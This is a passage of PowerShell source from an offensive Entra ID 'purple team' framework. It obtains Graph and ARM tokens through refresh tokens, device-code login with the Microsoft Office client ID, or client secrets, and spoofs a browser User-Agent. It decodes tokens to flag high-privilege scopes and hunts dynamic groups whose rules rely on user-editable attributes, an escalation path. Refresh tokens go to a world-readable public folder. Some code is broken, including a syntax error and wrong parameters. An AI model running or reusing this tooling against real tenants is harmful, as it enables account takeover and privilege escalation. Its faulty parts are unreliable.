
	function Get-Token-WithClientSecret {
        param(
            [string]$ClientID,
            [string]$ClientSecret,
            [string]$TenantID   
        )
		$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
		$body = @{
			"client_id"     = $ClientId
			"client_secret" = $ClientSecret
			"scope"         = "https://graph.microsoft.com/.default"
			"grant_type"    = "client_credentials"
			}
		return (Invoke-RestMethod -Method POST -Uri $url -Body $body -Headers $headers).access_token
		}

	if (-not $GraphAccessToken) { return }

    if($ClientID -ne $null -and $ClientSecret -ne $null -and $RefreshToken -eq $null){
        $authMethod = "client"
    }
    
    if( $RefreshToken -ne $null -and $ClientID -eq $null -and $ClientSecret -eq $null){
        $authMethod = "refresh"
    }

	if (Test-Path "C:\Users\Public\Dynamic_Groups.txt") {
		$choice = Read-Host "C:\Users\Public\Dynamic_Groups.txt exists. (D)elete / (A)ppend?"
		if ($choice -match "^[dD]$") {
			Remove-Item -Path "C:\Users\Public\Dynamic_Groups.txt" -Force
		} elseif ($choice -notmatch "^[aA]$") {
			return
		}
	}

	$headers = @{
		"Authorization"    = "Bearer $GraphAccessToken"
		"Content-Type"     = "application/json"
		"ConsistencyLevel" = "eventual"
		"Prefer"           = "odata.maxpagesize=999"
        "User-Agent"        = "$UserAgent"
	}

	$startTime = Get-Date
	$refreshIntervalMinutes = 7
	$groupApiUrl = "https://graph.microsoft.com/v1.0/groups?$filter=groupTypes/any(c:c eq 'Unified')&$select=id,displayName,membershipRule&$top=999"

	$totalGroupsScanned = 0

    $a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host ""
    Write-Host "==================== Invoke-FindDynamicGroups ====================" -ForegroundColor DarkCyan
    Write-Host "[>>] Initiating enumeration of Microsoft 365 groups to identify Dynamic groups in tenant: $TenantName" -ForegroundColor DarkCyan
    Write-Host "[>>] Execution Timestamp: $a" -ForegroundColor DarkCyan
    Write-Host "=================================================================" -ForegroundColor DarkCyan
    Write-Host ""

    do {
        $success = $false
		if ([Console]::KeyAvailable) {
			$key = [Console]::ReadKey($true)
			if ($key.Key -eq "Enter") {
				Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
				Write-Host "[1] Back To Menu"
				Write-Host "[2] Continue"
				$whatdoyou = Read-Host "Enter your choice"
		
				switch ($whatdoyou) {
					"1" {
						$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
						Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
						$success = $false
						Show-MainMenu
						break
					}
					"2" {
						Write-Host "[+] Continue script..." -ForegroundColor Green
					}
					default {
						Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
					}
				}
			}
		}
        do {
            try {
                $response = Invoke-RestMethod -Uri $groupApiUrl -Headers $headers -Method Get -ErrorAction Stop
                $success = $true
            } catch {
                $statusCode = $_.Exception.Response.StatusCode.value__
                if ($statusCode -eq 429) {
                    $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                    if (-not $retryAfter) { $retryAfter = 7 }
                    Write-Host "[!] Rate limit hit. Sleeping for $retryAfter seconds..." -ForegroundColor DarkYellow
                    Start-Sleep -Seconds ([int]$retryAfter)
                } elseif ($statusCode -eq 401) {
                    Write-Host "[!] Access token expired, refreshing..." -ForegroundColor DarkYellow
                    if ($authMethod -eq "refresh") {
                        $GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken -TenantID $TenantID
                    } elseif ($authMethod -eq "client") {
                        $GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -SecretId $SecretId -TenantID $TenantID
                    }
                    if (-not $GraphAccessToken) { return }
                    $headers["Authorization"] = "Bearer $GraphAccessToken"
                    $startTime = Get-Date
                } else {
                    Write-Host "[-] Unexpected error. Exiting." -ForegroundColor Red
                    return
                }
            }
        } while (-not $success)

        $groupsBatch = $response.value
        $batchCount = $groupsBatch.Count
        $scannedInBatch = 0

			foreach ($group in $groupsBatch) {
				if ([Console]::KeyAvailable) {
					$key = [Console]::ReadKey($true)
					if ($key.Key -eq "Enter") {
						Write-Host "`n[!]The operation is delayed" -ForegroundColor Yellow
						Write-Host "[1] Back To Menu"
						Write-Host "[2] Continue"
						$whatdoyou = Read-Host "Enter your choice"
				
						switch ($whatdoyou) {
							"1" {
								$a = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
								Write-Host "[>>] Exiting script, Timestamp: $a" -ForegroundColor DarkCyan
								$success = $false
								Show-MainMenu
								break
							}
							"2" {
								Write-Host "[+] Continue script..." -ForegroundColor Green
							}
							default {
								Write-Host "[!] Invalid choice. Resuming by default." -ForegroundColor Yellow
							}
						}
					}
				}
				$groupId = $group.id
				$groupName = $group.displayName
				$membershipRule = $group.membershipRule

				if ($membershipRule -ne $null) {
				
					Write-Host "[+] $groupName ($groupId) is Dynamic" -ForegroundColor DarkGreen

					$conditions = @()
					if ($membershipRule -match '\buser\.mail\b') { $conditions += "mail" }
					if ($membershipRule -match '\buser\.userPrincipalName\b') { $conditions += "userPrincipalName" }
					if ($membershipRule -match '\buser\.displayName\b') { $conditions += "displayName" }

					if ($conditions.Count -gt 0) {						
						  if ($membershipRule -match "@") {
							continue  
						}
						$joined = ($conditions -join " AND ")
						Write-Host "    [!] Contains sensitive rule: $joined" -ForegroundColor DarkYellow
						Write-Host "      [$groupName] => $membershipRule" -ForegroundColor DarkYellow
						$outputLine = "      [Sensitive Rule] $($groupName.PadRight(30)) : $($groupId.PadRight(40)) : $joined : $membershipRule"
					} else {

					}
					
			        try {
						Add-Content -Path "C:\Users\Public\Dynamic_groups.txt" -Value $outputLine
					} catch {
						Write-Host "[!] Failed to write to file: $_" -ForegroundColor Red
					}
				}

				$scannedInBatch++
				$totalGroupsScanned++
				$percent = [math]::Round(($scannedInBatch / $batchCount) * 100)
				Write-Progress -Activity "Scanning Dynamic Groups..." -Status "$percent% Complete in current batch" -PercentComplete $percent
			}

        if ((New-TimeSpan -Start $startTime).TotalMinutes -ge $refreshIntervalMinutes) {
            Write-Host "[...] Refresh interval reached, refreshing token" -ForegroundColor DarkYellow
            if ($authMethod -eq "refresh") {
                $GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
            } elseif ($authMethod -eq "client") {
                $GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -ClientSecret $ClientSecret
            }
            if (-not $GraphAccessToken) { return }
            $headers["Authorization"] = "Bearer $GraphAccessToken"
            $startTime = Get-Date
        }

        $groupApiUrl = $response.'@odata.nextLink'

    } while ($groupApiUrl)

    Write-Host "`n[*] Finished scanning. Total Groups Scanned: $totalGroupsScanned" -ForegroundColor DarkCyan
    $b = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host "Exported to C:\Users\Public\Dynamic_groups.txt" -ForegroundColor DarkCyan
    Write-Host "[>>] Timestamp: $b" -ForegroundColor DarkCyan

}


<#################################################################################################################################################>
<#################################################################################################################################################>
<#################################################################################################################################################>
function Banner {

        Write-Host "################################################################################################################" -ForegroundColor Cyan
        Write-Host "#                                                                                                              #" -ForegroundColor Cyan
        Write-Host "#     _    ____ _____     _____       _                    ____      _ _           _   _                       #" -ForegroundColor Cyan
        Write-Host "#    / \  |  _ \_   _|   | ____|_ __ | |_ _ __ __ _       / ___|___ | | | ___  ___| |_(_) ___   __ __          #" -ForegroundColor Cyan
        Write-Host "#   / _ \ | |_) || |_____|  _| | '_ \| __| '__/ _` |_____ | |   / _ \| | |/ _ \/ __| __| |/ _ \ |  '_  \        #" -ForegroundColor Cyan
        Write-Host "#  / ___ \|  _ < | |_____| |___| | | | |_| | | (_| |_____| |__| (_) | | |  __/ (__| |_| | (_) ||  | |  |       #" -ForegroundColor Cyan
        Write-Host "# /_/   \_\_| \_\|_|     |_____|_| |_|\__|_|  \__,_|      \____\___/|_|_|\___|\___|\__|_|\___/ |__| |__|       #" -ForegroundColor Cyan
        Write-Host "#                                                                                                              #" -ForegroundColor Cyan
        Write-Host "#               Entra ID Interactive Framework  |  For Purple Team Operations  |   By AB-inBev                 #" -ForegroundColor DarkYellow
        Write-Host "#                                                                     Author: Shaked Wiessman                  #" -ForegroundColor DarkCyan
        Write-Host "#                                                                                                              #" -ForegroundColor Cyan
        Write-Host "################################################################################################################" -ForegroundColor Cyan

}
        
        Banner
        function Get-TenantInputMethod {
            
            while ($true) {
                Write-Host ""
                Write-Host "==================== Tenant Selection Menu ====================" -ForegroundColor DarkCyan
                Write-Host "| 1) Enter tenant by **Name** (e.g., domain.onmicrosoft.com) " -ForegroundColor Yellow
                Write-Host "| 2) Enter tenant by **ID**   (GUID format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)" -ForegroundColor Yellow
                Write-Host "===============================================================" -ForegroundColor DarkCyan

                $choice = Read-Host "Enter your choice (1 or 2)"

                if ($choice -eq "1" -or $choice -eq "2") {
                    return $choice
                } else {
                    Write-Host "[!] Invalid choice. Please enter 1 or 2." -ForegroundColor Red
                }
            }
        }


        function Get-TenantIdentity {
            param ($Method)

            if ($Method -eq "1") {
                while ($true) {
                    Write-Host "`n==================== Tenant Domain Mode ====================" -ForegroundColor DarkCyan
                    Write-Host "[*] Please enter your full tenant domain (e.g., domain.onmicrosoft.com)" -ForegroundColor Cyan
                    $TenantName = Read-Host "Domain"

                    if (![string]::IsNullOrWhiteSpace($TenantName)) {
                        try {
                            $resp = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$TenantName/.well-known/openid-configuration" -ErrorAction Stop
                            return @{
                                TenantID = ($resp.issuer -split '/')[3]
                                Input    = $TenantName
                                Source   = "Domain"
                            }
                        } catch {
                            Write-Host "[!] The specified domain is invalid or not reachable." -ForegroundColor Red
                        }
                    } else {
                        Write-Host "[!] Input cannot be empty. Please provide a valid domain." -ForegroundColor DarkRed
                    }
                }
            }

            if ($Method -eq "2") {
                while ($true) {
                    Write-Host "`n==================== Tenant ID Mode ====================" -ForegroundColor DarkCyan
                    Write-Host "[*] Please enter your Tenant ID (GUID format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)" -ForegroundColor Cyan
                    $TenantID = Read-Host "Tenant ID"
                    
                    if (![string]::IsNullOrWhiteSpace($TenantID) -and $TenantID -match '^[0-9a-fA-F\-]{36}$') {
                        try {
                            $resp = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$TenantID/.well-known/openid-configuration" -ErrorAction Stop
                            return @{
                                TenantID = $TenantID
                                Input    = $TenantID
                                Source   = "ID"
                            }
                            
                        } catch {
                            Write-Host "[!] The specified Tenant ID is invalid or not reachable." -ForegroundColor Red
                        }
                    } else {
                        Write-Host "[!] Please enter a valid Tenant ID in GUID format." -ForegroundColor DarkRed
                    }
                }
            }
        }

        function Choose-IdentityType {
            while ($true) {
                Write-Host "`n===================== Identity Type Selection =====================" -ForegroundColor DarkCyan
                Write-Host ("{0,-5} {1,-25}" -f "ID", "Description") -ForegroundColor White
                Write-Host ("{0,-5} {1,-25}" -f "--", "-----------") -ForegroundColor White

                Write-Host ("{0,-5} {1,-25}" -f "1)", "User Account (UPN Login)") -ForegroundColor DarkYellow
                Write-Host ("{0,-5} {1,-25}" -f "2)", "Service Principal (ClientID)") -ForegroundColor DarkYellow
                Write-Host ("{0,-5} {1,-25}" -f "3)", "Go Back") -ForegroundColor DarkYellow
                Write-Host "`n[*] Please choose an identity type (1 or 2):" -ForegroundColor Cyan
                $choice = Read-Host "Input"

                switch ($choice) {
                    "1" { return $choice }
                    "2" { return $choice }
                    "3" { return Get-TenantIdentity }
                    default {
                        Write-Host "[!] Invalid selection. Please enter 1, 2 or 3." -ForegroundColor Red
                    }
                }
            }
        }


        function Choose-UserAuthFlow {
            while ($true) {
                Write-Host "`n================== User Authentication Method ==================" -ForegroundColor DarkCyan
                Write-Host ("{0,-5} {1,-25}" -f "ID", "Description") -ForegroundColor White
                Write-Host ("{0,-5} {1,-25}" -f "--", "-----------") -ForegroundColor White

                Write-Host ("{0,-5} {1,-25}" -f "1)", "Refresh Token (pre-obtained)") -ForegroundColor DarkYellow
                Write-Host ("{0,-5} {1,-25}" -f "2)", "Device Code Flow (interactive)") -ForegroundColor DarkYellow
                Write-Host ("{0,-5} {1,-25}" -f "3)", "Go Back") -ForegroundColor DarkGray 
                Write-Host "`n[*] Please select authentication method (1, 2 or 3):" -ForegroundColor Cyan
                $choice = Read-Host "Input"

                switch ($choice) {
                    "1" { return $choice }
                    "2" { return $choice }
                    "3" { return Choose-IdentityType }
                    default {
                        Write-Host "[!] Invalid selection. Please enter 1, 2 or 3." -ForegroundColor Red
                    }
                }
            }
        }



        function Decode-AccessToken {
            param ([string]$AccessToken)

            $parts = $AccessToken -split '\.'
            if ($parts.Length -ge 2) {
                $payload = $parts[1].Replace('-', '+').Replace('_', '/')
                switch ($payload.Length % 4) {
                    2 { $payload += '==' }
                    3 { $payload += '=' }
                }
                try {
                    $bytes = [System.Convert]::FromBase64String($payload)
                    $json = [System.Text.Encoding]::UTF8.GetString($bytes)
                    return $json | ConvertFrom-Json
                } catch {
                    Write-Host "[!] Failed to decode Access Token" -ForegroundColor DarkRed
                    return $null
                }
            } else {
                Write-Host "[!] Invalid Access Token format." -ForegroundColor DarkRed
                return $null
            }
        }

        $sensitiveScopes = @(
            "Directory.ReadWrite.All",
            "Directory.AccessAsUser.All",
            "RoleManagement.ReadWrite.Directory",
            "User.ReadWrite.All",
            "UserAuthenticationMethod.ReadWrite.All",
            "Application.ReadWrite.All",
            "Group.ReadWrite.All",
            "PrivilegedAccess.ReadWrite.AzureAD",
            "Policy.ReadWrite.ConditionalAccess"
        )
        $Global:Identities = @()

        function Initialize-Session {
            $TenantMethod = Get-TenantInputMethod
            $TenantInfo = Get-TenantIdentity -Method $TenantMethod
            $Global:TenantID = $TenantInfo.TenantID
            $Global:TenantName = $TenantInfo.Input
            $identityType = Choose-IdentityType

            if ($identityType -eq "1")  {
                $authMethod = Choose-UserAuthFlow

                if ($authMethod -eq "1") {
                    Write-Host "Enter your Refresh Token" -ForegroundColor DarkCyan
                    $RefreshToken = Read-Host "[>]"
                    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
		            $headers = @{ 'User-Agent' = $UserAgent }
                    $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token?api-version=1.0"
                    $refreshBodyGraph = @{
                        "client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                        "scope"         = "https://graph.microsoft.com/.default"
                        "grant_type"    = "refresh_token"
                        "refresh_token" = $RefreshToken
                    }
                    $refreshBodyARM = @{
                        "client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                        "scope"         = "https://management.azure.com/.default"
                        "grant_type"    = "refresh_token"
                        "refresh_token" = $RefreshToken
                    }
                    
                    try {
                        try {
                            $refreshResponseGraph = Invoke-RestMethod -Method POST -Uri $url -Body $refreshBodyGraph -Headers $headers -ContentType "application/x-www-form-urlencoded"
                            $GraphToken = $refreshResponseGraph.access_token
                            $RefreshToken = $refreshResponseGraph.refresh_token
                            $DecodedGraph = Decode-AccessToken -AccessToken $GraphToken
                            Write-Host "[+] Successfully received Graph Access Token" -ForegroundColor DarkGreen
                        } catch {
                            Write-Host "[-] Failed to get Graph Access Token" -ForegroundColor DarkRed
                            }
                            try {
                                $refreshResponseARM = Invoke-RestMethod -Method POST -Uri $url -Body $refreshBodyARM -Headers $headers -ContentType "application/x-www-form-urlencoded"
                                $ARMToken = $refreshResponseARM.access_token
                                $DecodedARM = Decode-AccessToken -AccessToken $ARMToken
                                Write-Host "[+] Successfully received ARM Access Token" -ForegroundColor DarkGreen
                            } catch {
                                Write-Host "[-] Failed to get ARM Access Token" -ForegroundColor DarkRed
                                }
                            if ($GraphToken -or $ARMToken) {
                                if ($DecodedGraph) {
                                    Write-Host "[+] Identity Info Extracted from Access Token (Graph):" -ForegroundColor DarkCyan
                                    if ($DecodedGraph.upn) {
                                        Write-Host "  UPN:        $($DecodedGraph.upn)" -ForegroundColor DarkGreen
                                    }
                                    if ($DecodedGraph.scp) {
                                        Write-Host "  Scopes:        $($DecodedGraph.scp)" -ForegroundColor DarkYellow
                                    }
                                    if ($DecodedGraph.roles) {
                                        Write-Host "  Roles:      $($DecodedGraph.roles -join ', ')" -ForegroundColor DarkYellow
                                    }
                                    Write-Host ""
                                    $CurrentUPN = $DecodedGraph.upn
                                    $CurrentEmail = $DecodedGraph.email
                                    $Tenant     = $DecodedGraph.tid
                                    $Scopes = $DecodedGraph.scp -split " " 
                                    $Global:Identities += [PSCustomObject]@{
                                        UPN             = $CurrentUPN
                                        Email           = $CurrentEmail
                                        TenantID        = $Tenant
                                        TenantName      = $TenantName 
                                        GraphToken      = $GraphToken
                                        ARMToken        = $ARMToken
                                        Scopes          = $Scopes
                                        RefreshToken    = $RefreshToken 
                                    }                      
                                }  
                                if ($DecodedARM) {
                                    Write-Host "`n[+] Identity Info Extracted from Access Token (ARM):" -ForegroundColor DarkCyan
                                    if ($DecodedARM.upn) {
                                        Write-Host "  UPN:        $($DecodedARM.upn)" -ForegroundColor DarkGreen
                                    } 
                                    if ($DecodedARM.scp) {
                                        Write-Host "  Scopes:     $($DecodedARM.scp)" -ForegroundColor DarkYellow
                                    }
                                    if ($DecodedARM.roles) {
                                        Write-Host "  Roles:      $($DecodedARM.roles -join ', ')" -ForegroundColor DarkYellow
                                    }
                                    Write-Host ""
                                }
                            return $true
                            }
                                if($GraphToken -eq $null -and $ARMToken -eq $null){
                                   return Choose-IdentityType 
                                }
                    }  catch {
                            Write-Host "[-] Failed to retrieve Access Token using Refresh Token." -ForegroundColor DarkRed
                        return $null
                    }
                
                } elseif ($authMethod -eq "2") {
                    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
		            $headers = @{ 'User-Agent' = $UserAgent }
                    $deviceCodeUrl = "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0"
       		        $Body = @{
            		    "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            		    "resource"     = "https://graph.microsoft.com"
                    }
                    $authResponse = Invoke-RestMethod -Method POST -Uri $deviceCodeUrl -Headers $headers -Body $Body
                    $deviceCode = $authResponse.device_code
                    $code = $authResponse.user_code
                    Write-Host "`n[#] Browser will open in 5 sec, Please enter this code:" -ForegroundColor DarkYellow -NoNewline
                    Write-Host " $code" -ForegroundColor DarkGray
                    Start-Sleep -Seconds 5
                    Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "https://microsoft.com/devicelogin"

                    $tokenUrl = "https://login.microsoftonline.com/common/oauth2/token?api-version=1.0"
                    $tokenBody = @{
                        "scope"      = "openid"
                        "client_id"  = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                        "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
                        "code"       = $deviceCode
                    }
                    while ($true) {
                        try {
                            $tokenResponse = Invoke-RestMethod -Method POST -Uri $tokenUrl -Headers $headers -Body $tokenBody -ErrorAction Stop -ContentType "application/x-www-form-urlencoded"
                            $RefreshToken = $tokenResponse.refresh_token
                            Set-Content -Path "C:\Users\Public\Refreshtoken.txt" -Value $RefreshToken
                            Write-Host "[>] Refresh Token saved to C:\Users\Public\Refreshtoken.txt" -ForegroundColor DarkGray

                            $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token?api-version=1.0"
                            $refreshBodyGraph = @{
                                "client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                                "scope"         = "https://graph.microsoft.com/.default"
                                "grant_type"    = "refresh_token"
                                "refresh_token" = $RefreshToken
                            }
                            $refreshBodyARM = @{
                                "client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                                "scope"         = "https://management.azure.com/.default"
                                "grant_type"    = "refresh_token"
                                "refresh_token" = $RefreshToken
                            }
                            try {
                                try {
                                    $refreshResponseGraph = Invoke-RestMethod -Method POST -Uri $url -Body $refreshBodyGraph -Headers $headers -ContentType "application/x-www-form-urlencoded"
                                    $GraphToken = $refreshResponseGraph.access_token
                                    $RefreshToken = $refreshResponseGraph.refresh_token
                                    $DecodedGraph = Decode-AccessToken -AccessToken $GraphToken
                                    Write-Host "[+] Successfully received Graph Access Token" -ForegroundColor DarkGreen
                                } catch {
                                    Write-Host "[-] Failed to get Graph Access Token" -ForegroundColor DarkRed
                                }

                                try {
                                    $refreshResponseARM = Invoke-RestMethod -Method POST -Uri $url -Body $refreshBodyARM -Headers $headers -ContentType "application/x-www-form-urlencoded"
                                    $ARMToken = $refreshResponseARM.access_token
                                    $DecodedARM = Decode-AccessToken -AccessToken $ARMToken
                                    Write-Host "[+] Successfully received ARM Access Token" -ForegroundColor DarkGreen
                                } catch {
                                    Write-Host "[-] Failed to get ARM Access Token" -ForegroundColor DarkRed
                                }
                                if ($GraphToken -or $ARMToken) {
                                    if ($DecodedGraph) {
                                        Write-Host "`n[+] Identity Info Extracted from Access Token (Graph):" -ForegroundColor DarkCyan

                                        if ($DecodedGraph.upn) {
                                            Write-Host "  UPN:        $($DecodedGraph.upn)" -ForegroundColor DarkGreen
                                        } 
                                        if ($DecodedGraph.scp) {
                                            Write-Host "  Scopes:        $($DecodedGraph.scp)" -ForegroundColor DarkYellow
                                        }
                                        if ($DecodedGraph.roles) {
                                            Write-Host "  Roles:      $($DecodedGraph.roles -join ', ')" -ForegroundColor DarkYellow
                                        }
                                        Write-Host ""
                                        
                                        $CurrentUPN = $DecodedGraph.upn
                                        $CurrentEmail = $DecodedGraph.email
                                        $Tenant     = $DecodedGraph.tid
                                        $Scopes = $DecodedGraph.scp -split " " 
                                        $Global:Identities += [PSCustomObject]@{
                                            UPN             = $CurrentUPN
                                            Email           = $CurrentEmail
                                            TenantID        = $Tenant
                                            TenantName      = $TenantName 
                                            GraphToken      = $GraphToken
                                            ARMToken        = $ARMToken
                                            Scopes          = $Scopes 
                                            RefreshToken    = $RefreshToken
                                        }                      

                                    }
                                    if ($DecodedARM) {
                                        Write-Host "`n[+] Identity Info Extracted from Access Token (ARM):" -ForegroundColor DarkCyan

                                        if ($DecodedARM.upn) {
                                            Write-Host "  UPN:        $($DecodedARM.upn)" -ForegroundColor DarkGreen
                                        }  
                                        if ($DecodedARM.scp) {
                                            Write-Host "  Scopes:     $($DecodedARM.scp)" -ForegroundColor DarkYellow
                                        }
                                        if ($DecodedARM.roles) {
                                            Write-Host "  Roles:      $($DecodedARM.roles -join ', ')" -ForegroundColor DarkYellow
                                        }
                                        Write-Host ""
                                    }
                                return $true
                                } elseif($GraphToken -eq $null -and $ARMToken -eq $null){
                                        return Choose-IdentityType 
                                }  
                            }
                            catch {
                                Write-Host "`n[-] Failed to retrieve Access Token using Refresh Token." -ForegroundColor DarkRed
			                    return $null
                            }
                        } catch {
                            $errorResponse = $_.ErrorDetails.Message | ConvertFrom-Json
                            if ($errorResponse.error -eq "authorization_pending") {
                                Start-Sleep -Seconds 5
                            } elseif ($errorResponse.error -eq "authorization_declined" -or $errorResponse.error -eq "expired_token") {
                                Write-Host "`n[-] Authorization failed or expired." -ForegroundColor DarkRed
                                return
                            } else {
                                Write-Host "`n[-] Unexpected error: $($errorResponse.error)" -ForegroundColor DarkRed
                                return
                            }
                        }
                    } 
                }
            } elseif ($identityType -eq "2") {
                Write-Host "  Enter your Client ID" -ForegroundColor DarkCyan
                $ClientID = Read-Host "  [>]"
                Write-Host "  Enter your Client Secret" -ForegroundColor DarkCyan
                $ClientSecret = Read-Host "  [>]"

                $Url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
                $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                $headers = @{ 'User-Agent' = $UserAgent }
                $bodyGraph = @{
                    "grant_type" = "client_credentials"
                    "scope" = "https://graph.microsoft.com/.default"
                    "client_id" = "$ClientID"
                    "client_secret" = "$ClientSecret"
                }
                $bodyARM = @{
                    "grant_type" = "client_credentials"
                    "scope" = "https://management.azure.com/.default"
                    "client_id" = "$ClientID"
                    "client_secret" = "$ClientSecret"
                }
                try {
                    try {
                        $refreshResponseGraph = Invoke-RestMethod -Method POST -Uri $url -Body $bodyGraph -Headers $headers -ContentType "application/x-www-form-urlencoded"
                        $GraphToken = $refreshResponseGraph.access_token
                        $RefreshToken = $refreshResponseGraph.refresh_token
                        $DecodedGraph = Decode-AccessToken -AccessToken $GraphToken
                        Write-Host "[+] Successfully received Graph Access Token" -ForegroundColor Green
                    } catch {
                        Write-Host "[-] Failed to get Graph Access Token" -ForegroundColor DarkRed
                    }
                    try {
                        $refreshResponseARM = Invoke-RestMethod -Method POST -Uri $url -Body $bodyARM -Headers $headers -ContentType "application/x-www-form-urlencoded"
                        $ARMToken = $refreshResponseARM.access_token
                        $DecodedARM = Decode-AccessToken -AccessToken $ARMToken
                        Write-Host "[+] Successfully received ARM Access Token" -ForegroundColor DarkGreen
                    } catch {
                        Write-Host "[-] Failed to get ARM Access Token" -ForegroundColor DarkRed
                    }
                    if ($GraphToken -or $ARMToken) {

                        $DecodedGraph = Decode-AccessToken -AccessToken $GraphToken
                        $DecodedARM = Decode-AccessToken -AccessToken $ARMToken
                        if ($DecodedGraph) {
                            Write-Host "`n[+] Identity Info Extracted from Access Token (Graph):" -ForegroundColor DarkCyan
                            if ($DecodedGraph.app_displayname) {
                                Write-Host "  App-Name:        $($DecodedGraph.app_displayname)" -ForegroundColor DarkGreen
                            } 
                            if ($DecodedGraph.scp) {
                                Write-Host "  App-Name:        $($DecodedGraph.scp)" -ForegroundColor DarkGreen
                            }
                            if ($DecodedGraph.roles) {
                                Write-Host "  Scopes:    " -NoNewline
                                $ScopesList = $DecodedGraph.roles -split " "
                                foreach ($scope in $ScopesList) {
                                    $trimmedScope = $scope.Trim()

                                    $isSensitive = $sensitiveScopes | Where-Object { $_.ToLower() -eq $trimmedScope.ToLower() }

                                    if ($isSensitive) {
                                        Write-Host "$trimmedScope " -ForegroundColor DarkRed -NoNewline
                                        $highprivilege = $true
                                    } else {
                                        Write-Host "$trimmedScope " -ForegroundColor DarkYellow -NoNewline
                                    }
                                }
                                Write-Host ""
                            }

                            $CurrentName = $DecodedGraph.app_displayname
                            $Tenant     = $DecodedGraph.tid
                            $Scopes = $DecodedGraph.scp -split " " 
                            if($highprivilege){
                                $High = "High Privileged Identity"
                            }
                            $Global:Identities += [PSCustomObject]@{
                                UPN             = $CurrentName 
                                GraphToken      = $GraphToken
                                ARMToken        = $ARMToken
                                TenantID        = $Tenant
                                TenantName      = $TenantName 
                                Scopes          = $Scopes
                                HighPrivileged  = $High
                                ClientID        = $ClientID
                                ClientSecret    = $ClientSecret
                            }     
                        }    

                        if ($DecodedARM) {
                            Write-Host "`n[+] Identity Info Extracted from Access Token (ARM):" -ForegroundColor DarkCyan

                            if ($DecodedARM.app_displayname) {
                                Write-Host "  App-Name:        $($DecodedARM.app_displayname)" -ForegroundColor |DarkGreen
                            } 
                            if ($DecodedARM.scp) {
                                Write-Host "  Scopes:     $($DecodedARM.scp)" -ForegroundColor DarkYellow
                            }
                            if ($DecodedARM.roles) {
                                Write-Host "  Roles:      $($DecodedARM.roles -join ', ')" -ForegroundColor DarkYellow
                            }
                            Write-Host ""
                        }
                            return $true

                    } elseif($GraphToken -eq $null -and $ARMToken -eq $null){
                        return Choose-IdentityType 
                    }  
                }   
                catch {
                    write-Host "fuck3"
                }
            }
        }   


    function Show-IdentitiesMenu {
        Write-Host "`n================== Authenticated Identities ==================" -ForegroundColor DarkGreen
        Write-Host ("{0,-5} {1,-50} {2,-40} {3,-10} {4,-10} {5,-20}" -f "ID", "User Principal Name", "Email","Graph", "ARM", "TenantID") -ForegroundColor White
        Write-Host ("{0,-5} {1,-50} {2,-40} {3,-10} {4,-10} {5,-20}" -f "--", "-------------------", "-------------------", "-----", "---", "-------------------") -ForegroundColor White

        for ($i = 0; $i -lt $Global:Identities.Count; $i++) {
            $user = $Global:Identities[$i]
            $graphStatus = if ($user.GraphToken) { " V" } else {" X" }
            $armStatus = if ($user.ARMToken) { " V" } else {" X" }

            Write-Host ("{0,-5} {1,-50} {2,-40} {3,-10} {4,-10} {5,-20}" -f "$($i+1))", $user.upn, $user.email, $graphStatus, $armStatus, $user.TenantID) -ForegroundColor DarkYellow

        }
        Write-Host ""
        Write-Host "`n[*] Total identities: $($Global:Identities.Count)" -ForegroundColor DarkCyan
        Write-Host "11) back to add identity" -ForegroundColor DarkGray
        Write-Host ""
        $choice = Read-Host "`n[>] Select identity by ID"
        if($choice -eq "11"){
            Get-TenantInputMethod
        }
        if ($choice -match '^\d+$' -and $choice -gt 0 -and $choice -le $Global:Identities.Count) {
            $SelectedIdentity = $Global:Identities[$choice - 1]  
            $Global:GraphAccessToken = $SelectedIdentity.GraphToken
            $Global:ARMAccessToken   = $SelectedIdentity.ARMToken
            $Global:RefreshToken     = $SelectedIdentity.refreshtoken
            $Global:ClientID         = $SelectedIdentity.ClientID
            $Global:ClientSecret     = $SelectedIdentity.ClientSecret
            $Global:HighPrivileged   = $SelectedIdentity.HighPrivileged
            $Global:TenantID         = $SelectedIdentity.TenantID
            $Global:TenantName       = $SelectedIdentity.TenantName
        

        if($user.email -eq $null -and $user.upn -ne $null) {
            Write-Host "`n[+] Loaded identity: $($SelectedIdentity.upn)" -ForegroundColor Green
            Write-Host ""
        }

        if($user.upn -eq $null -and $user.email -ne $null) {
            Write-Host "`n[+] Loaded identity: $($SelectedIdentity.email)" -ForegroundColor Green
